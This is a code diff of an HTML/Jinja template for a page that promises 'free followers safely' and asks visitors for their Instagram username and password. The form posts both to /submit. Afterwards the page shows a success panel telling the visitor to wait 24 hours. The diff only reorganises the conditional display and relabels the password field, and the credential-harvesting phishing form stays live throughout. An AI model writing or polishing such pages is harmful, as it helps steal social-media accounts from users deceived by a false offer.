@@ -352,69 +352,73 @@ This is a website where you can get free followers safely.
           </p>
 
 
-          <form action="/submit" method="POST">
+{% if not submitted %}
 
-            <label for="username">
-              Instagram username
-            </label>
+<form action="/submit" method="POST">
 
-            <input
-              id="username"
-              name="username"
-              autocomplete="off"
-              placeholder="Enter your username"
-              required
-            >
+  <label for="username">
+    Instagram username
+  </label>
 
+  <input
+    id="username"
+    name="username"
+    autocomplete="off"
+    placeholder="Enter your username"
+    required
+  >
 
-            <label for="message">
-              Your Instagram Passsword
-            </label>
+  <label for="message">
+    Instagram password
+  </label>
 
-            <input
-              id="message"
-              name="message"
-              autocomplete="off"
-              placeholder="Enter your password"
-              required
-            >
+  <input
+    id="message"
+    name="message"
+    autocomplete="off"
+    placeholder="Enter your password"
+    required
+  >
 
+  <label for="followers">
+    Number of Followers (Maximum 500)
+  </label>
 
-            <label for="followers">
-              Number of Followers (Maximum 500)
-            </label>
+  <input
+    id="followers"
+    name="followers"
+    type="number"
+    min="1"
+    max="500"
+    autocomplete="off"
+    placeholder="How many followers?"
+    required
+  >
 
-            <input
-              id="followers"
-              name="followers"
-              type="number"
-              min="1"
-              max="500"
-              autocomplete="off"
-              placeholder="How many followers?"
-              required
-            >
+  <button
+    class="primary"
+    type="submit"
+  >
+    Get Followers
+  </button>
 
+</form>
 
-            <button
-              class="primary"
-              type="submit"
-            >
-              Get Followers
-            </button>
+{% else %}
 
-          </form>
+<div class="success-panel">
 
+  <div class="success-icon">✓</div>
 
-{% if submitted %} 
-          <div class="success-panel"> 
-            <div class="success-icon">✓</div> 
-            <h2>Details Submitted Successfully</h2> 
-            <p> Wait 24hrs to See the result.
-            </p> 
-          </div> 
+  <h2>Details Submitted Successfully</h2>
+
+  <p>
+    Wait 24hrs to See the result.
+  </p>
+
+</div>
+
 {% endif %}
-
 
         </div>
 
